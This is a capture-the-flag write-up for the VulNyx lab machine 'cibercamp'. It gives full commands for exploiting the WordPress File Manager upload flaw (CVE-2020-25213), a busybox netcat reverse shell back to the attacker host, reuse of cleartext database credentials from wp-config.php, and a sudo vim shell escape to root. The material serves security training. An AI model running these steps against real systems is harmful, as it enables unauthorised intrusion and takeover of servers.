# cibercamp

## Executive Summary

| Machine | OS | Author | Category | Platform |
| :--- | :--- | :--- | :--- | :--- |
| cibercamp | Linux | EloyAlbiach | Easy | VulNyx |

**Summary:** The cibercamp target hosts an OpenSSH service on port 22 alongside an Apache web server on port 80 running a WordPress site. Probing the web server exposes a virtual host pointing to `iescamp.nyx`. After mapping the domain in the local hosts file, a WPScan assessment detects an outdated deployment of the WordPress File Manager plugin at version 6.0. This component is vulnerable to an unauthenticated arbitrary file upload flaw within its elFinder connector, cataloged under CVE 2020 25213. Leveraging an Exploit Database Python script against the connector uploads a PHP payload and triggers a Netcat reverse shell, granting initial foothold as `www-data`. Post exploitation inspection of `wp-config.php` yields cleartext MySQL database credentials for system account `wpuser`. Authenticating as `wpuser` via `su` enables lateral movement and grants access to the user flag. Reviewing sudo privileges for `wpuser` reveals an entry permitting the execution of `/usr/bin/vim` as any user. Passing an inline command escape sequence to Vim immediately escalates privileges to root, concluding the assessment with the retrieval of both system flags.

---

## Reconnaissance

Network discovery initiates across the local subnet to discover the target host and enumerate exposed services.

1. An ARP ping scan across the local network segment locates the active target host at 192.168.56.203:

```zsh
❯ sudo nmap -sn -PR 192.168.56.0/24
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-20 08:20 +0700
Nmap scan report for 192.168.56.100
Host is up (0.00022s latency).
MAC Address: 08:00:27:D0:30:5F (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.203
Host is up (0.0019s latency).
MAC Address: 08:00:27:4E:60:32 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.1
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 5.52 seconds
```

2. Defining the target IP address in an environment variable is followed by an initial comprehensive TCP port scan across all ports, exposing two open services:

```zsh
❯ ip=192.168.56.203
```

```zsh
❯ nmap -p- $ip                              
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-20 08:20 +0700
Nmap scan report for 192.168.56.203
Host is up (0.00020s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 3.31 seconds
```

3. Service version detection and default script scanning determine the software releases running on ports 22 and 80:

```zsh
❯ nmap -p 22,80 -sCV -Pn --min-rate 5000 $ip
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-20 08:21 +0700
Nmap scan report for 192.168.56.203
Host is up (0.00096s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a9:d0:ab:b6:b3:09:61:69:1d:74:66:09:fe:38:57:6e (ECDSA)
|_  256 68:c7:60:f7:52:c6:2b:94:dc:e1:f7:47:b6:3b:9c:43 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: cibercamp &#8211; La seguridad de tu empresa en las mejores ma...
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-generator: WordPress 5.4.19
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.61 seconds
```

4. Requesting the HTTP root reveals an Apache virtual host title and a DNS prefetch reference pointing to domain `iescamp.nyx`:

```zsh
❯ curl -s http://$ip/ | head     
<!DOCTYPE html>
<html lang="en-US">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>cibercamp &#8211; La seguridad de tu empresa en las mejores manos !!!</title>
<link rel='dns-prefetch' href='//iescamp.nyx' />
<link rel='dns-prefetch' href='//fonts.googleapis.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="cibercamp &raquo; Feed" href="http://iescamp.nyx/index.php/feed/" />
```

5. Adding the host entry to the local routing table permits proper domain resolution, followed by confirmation of the WordPress CMS version:

```zsh
❯ echo '192.168.56.203 iescamp.nyx' | sudo tee -a /etc/hosts
192.168.56.203 iescamp.nyx
```

```zsh
❯ url=http://iescamp.nyx/ 
```

```zsh
❯ curl -s $url | grep -i "wordpress"
<meta name="generator" content="WordPress 5.4.19" />
```

6. Automated WordPress vulnerability scanning with WPScan discovers the active theme, enumerated users, and an outdated File Manager plugin installation:

```zsh
❯ wpscan --url $url -e vp,vt,u --api-token $token
WARNING: Nokogiri was built against libxml version 2.15.3, but has dynamically loaded 2.15.4
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

                  WordPress Security Scanner
                         Version 4.0.1
                    An Automattic endeavor
                    https://automattic.com
_______________________________________________________________

[+] URL: http://iescamp.nyx/ [192.168.56.203]
[+] Started: Sun Sep 20 08:28:30 2026
[+] Command Line: wpscan --url http://iescamp.nyx/ -e vp,vt,u --api-token [REDACTED]
[+] Hostname: archlinux

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.58 (Ubuntu)
 |  - X-Developer-Note: Intranet local disponible en iescamp.local
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://iescamp.nyx/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://iescamp.nyx/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://iescamp.nyx/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://iescamp.nyx/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.19 identified (Insecure, released on 2026-03-12).
 | Found By: Rss Generator (Passive Detection)
 |  - http://iescamp.nyx/index.php/feed/, <generator>https://wordpress.org/?v=5.4.19</generator>
 | Confirmed By: Rss Generator (Passive Detection)
 |  - http://iescamp.nyx/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.19</generator>
 |
 | [!] 14 vulnerabilities identified:
 |
 | [!] Title: WP < 7.0.3 - Subscriber+ Email Change Confirmation Bypass
 |     UUID: 5ca38157-6fae-4271-a242-2a8584505d1e
 |     Fixed in: 5.4.20
 |     References:
 |      - https://wpscan.com/vulnerability/5ca38157-6fae-4271-a242-2a8584505d1e
 |      - https://wordpress.org/news/2026/08/wordpress-7-0-3-release/
 |
 | [!] Title: WP < 7.0.3 - Unauthenticated Blind SSRF
 |     UUID: e1b9918e-1db9-4d95-be44-3241e52946eb
 |     Fixed in: 7.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/e1b9918e-1db9-4d95-be44-3241e52946eb
 |      - https://wordpress.org/news/2026/08/wordpress-7-0-3-release/
 |
 | [!] Title: WP < 7.0.3 - Contributor+ Stored XSS in Quick Edits
 |     UUID: 72b68d3f-77a0-47dd-9624-e3631409a352
 |     Fixed in: 7.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/72b68d3f-77a0-47dd-9624-e3631409a352
 |      - https://wordpress.org/news/2026/08/wordpress-7-0-3-release/
 |
 | [!] Title: WP < 7.0.3 - Subscriber+ Arbitrary Site Creation on Multisite
 |     UUID: b9b44801-3260-4f5a-a4cb-74f2de87e0d1
 |     Fixed in: 5.4.20
 |     References:
 |      - https://wpscan.com/vulnerability/b9b44801-3260-4f5a-a4cb-74f2de87e0d1
 |      - https://wordpress.org/news/2026/08/wordpress-7-0-3-release/
 |
 | [!] Title: WP < 7.0.3 - Reflected XSS
 |     UUID: 4594236f-c7ad-41d6-945b-170eaabe2b75
 |     Fixed in: 5.4.20
 |     References:
 |      - https://wpscan.com/vulnerability/4594236f-c7ad-41d6-945b-170eaabe2b75
 |      - https://wordpress.org/news/2026/08/wordpress-7-0-3-release/
 |
 | [!] Title: WP < 7.0.4 - Author+ RCE via PDF Upload
 |     UUID: 5061a614-ee26-422a-b4e8-ec88b96bb3cd
 |     Fixed in: 5.4.21
 |     References:
 |      - https://wpscan.com/vulnerability/5061a614-ee26-422a-b4e8-ec88b96bb3cd
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-65640
 |      - https://wordpress.org/news/2026/08/wordpress-7-0-4-release/
 |
 | [!] Title: WP < 7.1.1 - Unauthenticated Stored XSS via Comments
 |     UUID: aa354358-3a32-4e81-8628-d1aa917b5efa
 |     Fixed in: 5.4.22
 |     References:
 |      - https://wpscan.com/vulnerability/aa354358-3a32-4e81-8628-d1aa917b5efa
 |      - https://wordpress.org/news/2026/09/wordpress-7-1-1-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.1 - Admin+ Stored XSS via Custom Header
 |     UUID: 0e4cc769-a934-4883-9da5-5721133c6305
 |     Fixed in: 5.4.22
 |     References:
 |      - https://wpscan.com/vulnerability/0e4cc769-a934-4883-9da5-5721133c6305
 |      - https://wordpress.org/news/2026/09/wordpress-7-1-1-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.1 - Theme Installation via CSRF
 |     UUID: 2624e094-6c88-43b4-812f-26444994737d
 |     Fixed in: 5.4.22
 |     References:
 |      - https://wpscan.com/vulnerability/2624e094-6c88-43b4-812f-26444994737d
 |      - https://wordpress.org/news/2026/09/wordpress-7-1-1-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.1 - Admin+ Network-Wide Plugin Activation on Multisite
 |     UUID: 0d1f24a1-2161-47cc-8c2d-c3009161153d
 |     Fixed in: 5.4.22
 |     References:
 |      - https://wpscan.com/vulnerability/0d1f24a1-2161-47cc-8c2d-c3009161153d
 |      - https://wordpress.org/news/2026/09/wordpress-7-1-1-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.1 - Admin+ CSS Injection on Multisite via XML-RPC
 |     UUID: c16c950c-1a46-4068-8ce9-6e50f9e703b5
 |     Fixed in: 5.4.22
 |     References:
 |      - https://wpscan.com/vulnerability/c16c950c-1a46-4068-8ce9-6e50f9e703b5
 |      - https://wordpress.org/news/2026/09/wordpress-7-1-1-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.1 - Contributor+ Arbitrary Post Modification
 |     UUID: e32e8e71-7618-42a7-8a1c-b00750e8581b
 |     Fixed in: 5.4.22
 |     References:
 |      - https://wpscan.com/vulnerability/e32e8e71-7618-42a7-8a1c-b00750e8581b
 |      - https://wordpress.org/news/2026/09/wordpress-7-1-1-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.1 - Contributor+ Unpublished Post Title Disclosure
 |     UUID: 3da4bdfe-948b-41b6-88fd-7cac9f3b7f73
 |     Fixed in: 5.4.22
 |     References:
 |      - https://wpscan.com/vulnerability/3da4bdfe-948b-41b6-88fd-7cac9f3b7f73
 |      - https://wordpress.org/news/2026/09/wordpress-7-1-1-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.1 - Author+ Unauthorized Note Reparenting via REST API
 |     UUID: bde07f91-aeb2-4875-88f2-4b18e42e331e
 |     Fixed in: 5.4.22
 |     References:
 |      - https://wpscan.com/vulnerability/bde07f91-aeb2-4875-88f2-4b18e42e331e
 |      - https://wordpress.org/news/2026/09/wordpress-7-1-1-maintenance-and-security-release/

[+] WordPress theme in use: it-security
 | Location: http://iescamp.nyx/wp-content/themes/it-security/
 | Last Updated: 2026-08-28 5:00pm GMT (22 days ago, per WordPress.org)
 | Active Installs: 100 (per WordPress.org)
 | Readme: http://iescamp.nyx/wp-content/themes/it-security/readme.txt
 | [!] The version is out of date, the latest version is 0.3.9
 | Style URL: http://iescamp.nyx/wp-content/themes/it-security/style.css?ver=5.4.19
 | Style Name: IT Security
 | Style URI: https://www.theclassictemplates.com/products/it-security
 | Description: The IT Security theme is a powerful, modern solution designed for cybersecurity firms, IT consultant...
 | Author: classictemplate
 | Author URI: https://www.theclassictemplates.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 0.3.6 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://iescamp.nyx/wp-content/themes/it-security/style.css?ver=5.4.19, Match: 'Version: 0.3.6'

[+] Enumerating Vulnerable Plugins (via Passive and Aggressive Methods)

[+] akismet
 | Location: http://iescamp.nyx/wp-content/plugins/akismet/
 | Latest Version: 5.7.2
 | Last Updated: 2026-08-18 11:42pm GMT (1 month ago, per WordPress.org)
 | Active Installs: 5,000,000 (per WordPress.org)
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://iescamp.nyx/wp-content/plugins/akismet/, status: 403
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)
 |     UUID: 1a2f3094-5970-4251-9ed0-ec595a0cd26c
 |     Fixed in: 3.1.5
 |     References:
 |      - https://wpscan.com/vulnerability/1a2f3094-5970-4251-9ed0-ec595a0cd26c
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9357
 |      - http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/
 |      - https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html
 |
 | The version could not be determined.

[+] wp-file-manager
 | Location: http://iescamp.nyx/wp-content/plugins/wp-file-manager/
 | Last Updated: 2026-04-21 12:53pm GMT (5 months ago, per WordPress.org)
 | Active Installs: 1,000,000 (per WordPress.org)
 | Readme: http://iescamp.nyx/wp-content/plugins/wp-file-manager/readme.txt
 | [!] The version is out of date, the latest version is 8.0.4
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://iescamp.nyx/wp-content/plugins/wp-file-manager/, status: 200
 |
 | [!] 9 vulnerabilities identified:
 |
 | [!] Title: File Manager < 6.5 - Backup File Directory Listing
 |     UUID: 49533dc2-17cb-459c-af28-69a7b9b9512f
 |     Fixed in: 6.5
 |     References:
 |      - https://wpscan.com/vulnerability/49533dc2-17cb-459c-af28-69a7b9b9512f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-24312
 |      - https://zeroaptitude.com/zerodetail/wordpress-plugin-bug-hunting-part-1/
 |      - https://plugins.trac.wordpress.org/changeset/2326268/wp-file-manager
 |
 | [!] Title: File Manager 6.0-6.9 - Unauthenticated Arbitrary File Upload leading to RCE
 |     UUID: e528ae38-72f0-49ff-9878-922eff59ace9
 |     Fixed in: 6.9
 |     References:
 |      - https://wpscan.com/vulnerability/e528ae38-72f0-49ff-9878-922eff59ace9
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25213
 |      - https://blog.nintechnet.com/critical-zero-day-vulnerability-fixed-in-wordpress-file-manager-700000-installations/
 |      - https://www.wordfence.com/blog/2020/09/700000-wordpress-users-affected-by-zero-day-vulnerability-in-file-manager-plugin/
 |      - https://seravo.com/blog/0-day-vulnerability-in-wp-file-manager/
 |      - https://blog.sucuri.net/2020/09/critical-vulnerability-file-manager-affecting-700k-wordpress-websites.html
 |      - https://twitter.com/w4fz5uck5/status/1298402173554958338
 |
 | [!] Title: WP File Manager < 7.1 - Reflected Cross-Site Scripting (XSS)
 |     UUID: 1cf3d256-cf4b-4d1f-9ed8-e2cc6392d8d8
 |     Fixed in: 7.1
 |     References:
 |      - https://wpscan.com/vulnerability/1cf3d256-cf4b-4d1f-9ed8-e2cc6392d8d8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24177
 |      - https://n4nj0.github.io/advisories/wordpress-plugin-wp-file-manager-i/
 |      - https://plugins.trac.wordpress.org/changeset/2476829/
 |
 | [!] Title: File Manager < 7.2.2 - Sensitive Information Exposure via Backup Filenames
 |     UUID: e1b4077a-2b56-4fd9-9a19-d758dacb08a4
 |     Fixed in: 7.2.2
 |     References:
 |      - https://wpscan.com/vulnerability/e1b4077a-2b56-4fd9-9a19-d758dacb08a4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-0761
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/1928f8e4-8bbe-4a3f-8284-aa12ca2f5176
 |
 | [!] Title: File Manager And File Manager Pro (Multiple Versions) - Directory Traversal
 |     UUID: e04c3f89-55c7-4d8c-9a11-a16cc64079e9
 |     Fixed in: 7.2.2
 |     References:
 |      - https://wpscan.com/vulnerability/e04c3f89-55c7-4d8c-9a11-a16cc64079e9
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-6825
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/93f377a1-2c33-4dd7-8fd6-190d9148e804
 |
 | [!] Title: File Manager < 7.2.5 - Cross-Site Request Forgery to Local JS File Inclusion
 |     UUID: fd0ed716-1e6b-4fcc-a5b4-cf03d07857e6
 |     Fixed in: 7.2.5
 |     References:
 |      - https://wpscan.com/vulnerability/fd0ed716-1e6b-4fcc-a5b4-cf03d07857e6
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-1538
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/57cc15a6-2cf5-481f-bb81-ada48aa74009
 |
 | [!] Title: File Manager < 7.2.6 - Authenticated (Administrator+) Directory Traversal
 |     UUID: 4acb0a40-1f56-4489-9432-3475ff753c45
 |     Fixed in: 7.2.6
 |     References:
 |      - https://wpscan.com/vulnerability/4acb0a40-1f56-4489-9432-3475ff753c45
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-2654
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/ca98fbc6-8cfa-4997-8a46-344afb75a97e
 |
 | [!] Title: File Manager < 7.2.8 - Missing Authorization
 |     UUID: 05d82b75-f4b8-432e-bfbc-65edcd1c4376
 |     Fixed in: 7.2.8
 |     References:
 |      - https://wpscan.com/vulnerability/05d82b75-f4b8-432e-bfbc-65edcd1c4376
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-37254
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/88db56a6-8e4c-4ef8-b51a-a2744c3132e2
 |
 | [!] Title: Multiple elFinder Plugins - Authenticated OS Command Injection
 |     UUID: a27f70b7-a4cc-42fa-88c1-19adfe1593a8
 |     Fixed in: 8.0.4
 |     References:
 |      - https://wpscan.com/vulnerability/a27f70b7-a4cc-42fa-88c1-19adfe1593a8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-6382
 |
 | Version: 6.0 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://iescamp.nyx/wp-content/plugins/wp-file-manager/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://iescamp.nyx/wp-content/plugins/wp-file-manager/readme.txt
 Checking Known Locations - Time: 00:00:53 <========================> (7343 / 7343) 100.00% Time: 00:00:53
[i] 2 plugin(s) Identified.
[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:04 <==========================> (652 / 652) 100.00% Time: 00:00:04
[i] No themes Found.
[+] Enumerating Users (via Passive and Aggressive Methods)

[+] eloyprofe
 | Found By: Author Posts - Author Pattern (Passive Detection)
 Brute Forcing Author IDs - Time: 00:00:00 <============================> (10 / 10) 100.00% Time: 00:00:00
[i] 1 user(s) Identified.
[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 4
 | Requests Remaining: 20
[+] Finished: Sun Sep 20 08:29:39 2026
[+] Requests Done: 16033
[+] Cached Requests: 37
[+] Most response codes received: 500: 15997, 200: 22, 404: 9, 403: 4, 301: 1
[!] Too many server errors (5xx). The target may be experiencing issues or blocking requests
[+] Data Sent: 4.225 MB
[+] Data Received: 7.689 MB
[+] Memory used: 378.375 MB
[+] Elapsed time: 00:01:08
```

7. Testing the elFinder connector script directly verifies that the endpoint is reachable without authentication, returning an HTTP 200 status code:

```zsh
❯ curl -s "http://iescamp.nyx/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php" -o /dev/null -w "%{http_code}\n"
200
```

---

## Initial Access

### Arbitrary File Upload in WordPress File Manager

8. Searching the local Exploit Database repository identifies a dedicated Python exploit for the arbitrary file upload vulnerability in File Manager version 6.9 and earlier:

```zsh
❯ searchsploit wp-file-manager
------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                          |  Path
------------------------------------------------------------------------ ---------------------------------
WP-file-manager v6.9 - Unauthenticated Arbitrary File Upload leading to | php/webapps/51224.py
------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

```zsh
❯ searchsploit -m php/webapps/51224.py            
  Exploit: WP-file-manager v6.9 - Unauthenticated Arbitrary File Upload leading to RCE
      URL: https://www.exploit-db.com/exploits/51224
     Path: /usr/share/exploitdb/exploits/php/webapps/51224.py
    Codes: CVE-2020-25213
 Verified: True
File Type: Python script, ASCII text executable, with very long lines (501)
Copied to: /home/setyanoegraha/projects/labs/nyx/51224.py
```

9. Executing the exploit script against the target URL confirms unauthenticated remote command execution under the `www-data` service identity:

```zsh
❯ python3 51224.py $url id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

10. Starting the Penelope listener on port 6666 and passing a busybox Netcat command through the exploit triggers a reverse shell callback:

```zsh
❯ penelope -p 6666
...
```

```zsh
❯ python3 51224.py $url "busybox nc 192.168.56.1 6666 -e /bin/bash"
```

11. Interacting with the reverse shell confirms access as `www-data` and inspecting the system password file reveals interactive user accounts with login shells:

```zsh
...
www-data@cibercamp:/var/www/html/wordpress/wp-content/plugins/wp-file-manager/lib/files$ cat /etc/passwd |grep "sh$"
root:x:0:0:root:/root:/bin/bash
administrador:x:1000:1000:administrador:/home/administrador:/bin/bash
wpuser:x:1001:1001:,,,:/home/wpuser:/bin/bash
```

---

## Lateral Movement

### Database Password Reuse for wpuser

12. Reviewing the WordPress configuration file discloses database authentication parameters including the cleartext password for system user `wpuser`:

```zsh
www-data@cibercamp:/var/www/html/wordpress$ cat wp-config.php 
...
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wpuser' );

/** MySQL database password */
define( 'DB_PASSWORD', 'passwordsuperseguroxx' );
...
```

13. Authenticating as user `wpuser` with the recovered password succeeds, granting local user shell access and revealing the user flag:

```zsh
www-data@cibercamp:/var/www/html/wordpress$ su - wpuser
Password: 
wpuser@cibercamp:~$ id;whoami;hostname
uid=1001(wpuser) gid=1001(wpuser) groups=1001(wpuser),100(users)
wpuser
cibercamp
wpuser@cibercamp:~$ ls -la
total 32
drwx------ 4 wpuser wpuser 4096 may 24 14:13 .
drwxr-xr-x 4 root   root   4096 may 18 20:14 ..
lrwxrwxrwx 1 root   root      9 may 24 13:48 .bash_history -> /dev/null
-rw-r--r-- 1 wpuser wpuser  220 may 18 20:14 .bash_logout
-rw-r--r-- 1 wpuser wpuser 3771 may 18 20:14 .bashrc
drwx------ 2 wpuser wpuser 4096 may 18 22:29 .cache
-rw-rw-r-- 1 wpuser wpuser    0 may 24 14:13 .hushlogin
drwxrwxr-x 3 wpuser wpuser 4096 may 23 15:02 .local
-rw-r--r-- 1 wpuser wpuser  807 may 18 20:14 .profile
-r-------- 1 wpuser wpuser   34 may 23 23:08 user.txt
```

---

## Privilege Escalation

### Sudo Vim Shell Escape

14. Enumerating sudo rights for user `wpuser` reveals permission to run the Vim editor as root without restrictions on command arguments:

```zsh
wpuser@cibercamp:~$ sudo -l
[sudo] password for wpuser: 
Matching Defaults entries for wpuser on cibercamp:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User wpuser may run the following commands on cibercamp:
    (ALL) /usr/bin/vim
```

15. Invoking Vim with an inline shell execution parameter immediately spawns an interactive root shell, allowing retrieval of both the user and root flags:

```zsh
wpuser@cibercamp:~$ sudo -u root /usr/bin/vim -c ':!sudo -i'

root@cibercamp:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
cibercamp
root@cibercamp:~# cat /home/wpuser/user.txt /root/root.txt 
ebc...

bff...
```

---

## Attack Chain Summary

1. **Reconnaissance**: Network discovery identified the target host at 192.168.56.203, and port scanning revealed OpenSSH on port 22 and an Apache web server on port 80 hosting a WordPress instance.
2. **Vulnerability Discovery**: Interrogating the web service uncovered the domain iescamp.nyx, and subsequent WPScan enumeration identified an unauthenticated arbitrary file upload flaw in version 6.0 of the File Manager plugin.
3. **Exploitation**: An exploit script targeting the vulnerable elFinder connector uploaded a PHP webshell, triggering a reverse shell callback that established interactive system access as `www-data`.
4. **Internal Enumeration**: Enumerating local accounts and reading the WordPress configuration file exposed cleartext database credentials, enabling lateral movement to user wpuser.
5. **Privilege Escalation**: Sudo enumeration demonstrated that wpuser could execute the Vim binary as root, which was leveraged through an internal shell escape to achieve full root privileges and read all flags.
